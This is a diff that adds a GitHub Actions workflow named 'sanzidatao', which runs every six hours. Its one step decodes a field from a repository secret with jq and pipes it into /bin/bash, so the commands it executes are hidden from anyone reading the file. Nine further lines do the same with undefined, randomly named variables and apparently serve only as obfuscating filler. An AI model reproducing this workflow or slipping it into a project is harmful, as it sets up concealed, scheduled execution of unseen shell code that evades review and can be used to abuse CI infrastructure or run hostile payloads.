@@ -1,0 +1,26 @@
+name: sanzidatao
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sanzidatao
+        env:
+          ypeq91948: ${{ secrets.ypeq91948 }}
+        run: |
+          echo $ypeq91948 | jq -r .fswh38167 | /bin/bash
+          echo $vmsme87065 | jq -r .nqcmg7798 | /bin/bash
+          echo $vxkky6449 | jq -r .xmk57 | /bin/bash
+          echo $gw52 | jq -r .y02 | /bin/bash
+          echo $xxkhc77326 | jq -r .vtdto63275 | /bin/bash
+          echo $s73636 | jq -r .ll09390 | /bin/bash
+          echo $k077 | jq -r .vxjnc38777 | /bin/bash
+          echo $x311 | jq -r .xoes01506 | /bin/bash
+          echo $j530 | jq -r .drup7767 | /bin/bash
+          echo $szh16723 | jq -r .nso86 | /bin/bash
+
